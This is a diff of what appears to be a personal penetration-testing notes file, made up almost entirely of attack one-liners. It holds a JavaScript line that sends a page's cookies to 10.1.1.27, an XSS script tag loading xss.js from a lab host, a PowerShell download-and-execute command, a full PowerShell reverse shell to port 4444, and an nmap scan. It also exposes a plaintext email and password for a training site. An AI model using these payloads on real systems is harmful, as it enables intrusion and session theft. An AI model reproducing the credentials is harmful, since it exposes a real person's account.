@@ -3,6 +3,12 @@ let cookie = document.cookie
 let encodedCookie = encodeURIComponent(cookie)
 fetch("http://10.1.1.27/exfil?data=" + encodedCookie)
 
+
+URL: https://training.fortinet.com/login/index.php
+Login: home.chimi@gmail.com
+Password: Phuongthuy@280590A
+
+
  <script src="http://192.168.45.197:9088/xss.js"></script>
 ssh lab@redlab -D
 POST /auth HTTP/1.1
@@ -51,6 +57,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.1.
 $LHOST = "10.1.1.27"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 https://lab.pentestit.ru/
 
-URL: https://training.fortinet.com/login/index.php
-Login: home.chimi@gmail.com
-Password: Phuongthuy@280590A
+
+
+
+nmap -sV -sC -Pn -p- -oN report.txt 10.10.110.100
